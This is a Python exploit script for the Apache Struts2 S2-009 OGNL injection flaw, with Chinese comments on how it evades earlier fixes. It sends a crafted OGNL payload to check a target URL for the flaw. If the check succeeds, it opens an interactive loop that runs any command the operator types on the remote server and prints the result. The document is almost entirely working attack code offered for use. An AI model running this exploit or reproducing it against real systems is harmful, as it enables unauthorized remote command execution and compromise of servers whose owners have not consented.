import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}


def s2_009(url):
    # Struts2对S2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；后来Struts2对S2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。
    # 但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。
    # 所以，我们可以将OGNL表达式放在example参数中，然后使用/helloword.acton?example=<OGNL statement>&(example)('xxx')=1的方法来执行它，从而绕过官方对#、\等特殊字符的防御。
    # 影响版本Struts 2.1.0-2.3.1.1
    payload = 'age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22echo test%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'
    post_url = url + '?' + payload
    s = requests.get(url=post_url, headers=headers)
    if 'test' in s.text:
        print("存在s2-009漏洞")
        s2_009exp(url)
    else:
        pass


def s2_009exp(url):
    while True:
        exec = input("exec:")
        payload1 = 'age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22' + exec + '%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'
        get_url = url + '?' + payload1
        page = requests.get(url=get_url, headers=headers)
        print(page.text)


if __name__ == '__main__':
    url = input("the url:")
    s2_009(url)
